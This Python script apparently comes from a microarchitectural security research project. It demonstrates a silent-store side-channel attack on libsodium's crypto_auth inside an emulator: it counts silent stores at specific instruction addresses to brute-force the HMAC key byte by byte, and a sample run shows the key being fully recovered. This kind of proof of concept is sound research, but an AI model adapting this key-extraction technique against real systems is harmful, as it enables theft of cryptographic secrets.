#!/usr/bin/env python3

"""
david.mateos@AF-519:~/pandora_fuzzing_dev/revizor$ time ./src/attack_auth_ssi.py
Real key: ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c780538892ff5d2

ec
ec66
ec660d
ec660d0d
ec660d0dd8
ec660d0dd8c0
ec660d0dd8c0df
ec660d0dd8c0df74
ec660d0dd8c0df74f7
ec660d0dd8c0df74f7fe
ec660d0dd8c0df74f7fe50
ec660d0dd8c0df74f7fe50f0
ec660d0dd8c0df74f7fe50f057
ec660d0dd8c0df74f7fe50f05738
ec660d0dd8c0df74f7fe50f0573862
ec660d0dd8c0df74f7fe50f057386286
ec660d0dd8c0df74f7fe50f05738628691
ec660d0dd8c0df74f7fe50f05738628691fa
ec660d0dd8c0df74f7fe50f05738628691fad5
ec660d0dd8c0df74f7fe50f05738628691fad513
ec660d0dd8c0df74f7fe50f05738628691fad51318
ec660d0dd8c0df74f7fe50f05738628691fad51318a6
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c78
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c7805
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c780538
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c78053889
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c780538892f
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c780538892ff5
ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c780538892ff5d2

Recovered key: ec660d0dd8c0df74f7fe50f05738628691fad51318a6dd7f9c780538892ff5d2


real    7m10,867s
user    7m22,690s
sys     0m25,396s
"""

import ctypes
import time
import random
from model import SilentStoreInitializedMemTracer, X86UnicornModel
from input_generator import AuthInputGenerator, Input
from interfaces import RawTrace
from attack_common import xor_byte, check_correct_file

KEY_LENGTH = 32

class Service:
	"""
	This models a service that authenticates some message with crypto_auth using
	a secret key. It assumes the attacker can try to authenticate an arbitrary
	message, observe silent stores and get the traces of the PCs where these
	silent stores happened, using trace(). The attacker's goal is to leak the
	secret key.
	"""
	def __init__(self):
		self.key = random.randbytes(KEY_LENGTH)

		self.model = X86UnicornModel("targets/libsodium", "crypto_auth")
		self.model.tracer = SilentStoreInitializedMemTracer(None)
		self.input_gen = AuthInputGenerator(self.model.STACK, self.model.STACK_SIZE)

	def trace(self, message: bytes) -> RawTrace:
		input_ = self.input_gen.create_input(message, self.key)
		trace, _ = self.model.trace_test_case(input_)
		return trace.trace

	def get_key(self) -> bytes:
		return self.key

def main():
	check_correct_file("targets/libsodium")
	service = Service()

	key = service.get_key()
	print(f"Real key: {key.hex()}\n")

	def n_correct_bytes(key_guessed):
		# Get the PCs where silent stores happen
		trace = service.trace(key_guessed)
		pcs = [int(observation, 16) for observation in trace]

		# This is the PC where the write operation of `state->buf[i] = in[i]` happens,
		# where `in` will be `key_guessed`, and `state->buf` will be initialised to
		# the real key xored with 0x36.
		# https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/crypto_hash/sha512/cp/hash_sha512_cp.c#L233
		# mov BYTE PTR [rcx+rax*1+0x50], dl
		# If we measure how many silent store happen here, we can know how many bytes of
		# `key_guessed` match `key ^ 0x36`.
		PC_SS = 0x403c9c

		# The operation `sha512_update(octx, ihash, 64)` may also produce silent stores
		# on the same PC. To avoid counting them, we trim the last part of the trace.
		# https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/crypto_hash/sha512/cp/hash_sha512_cp.c#L56
		# mov QWORD PTR [rdx+rax*8],rcx in SHA512_Transform
		PC_DELIMIT = 0x402d87
		if pcs.count(PC_DELIMIT):
			pcs = pcs[:pcs.index(PC_DELIMIT)]

		return pcs.count(PC_SS)

	key = bytes()
	assert n_correct_bytes(key) == 0

	# Bruteforce byte by byte
	while len(key) < KEY_LENGTH:
		for b in range(256):
			b = bytes([b])
			n = n_correct_bytes(key + b)
			if n > len(key):
				assert n == len(key) + 1
				key += b
				print(xor_byte(key, 0x36).hex())
				break
		else:
			raise Exception(f"Failed to bruteforce byte {len(key)}")

	key = xor_byte(key, 0x36)
	print(f"\nRecovered key: {key.hex()}\n")

if __name__ == "__main__":
	main()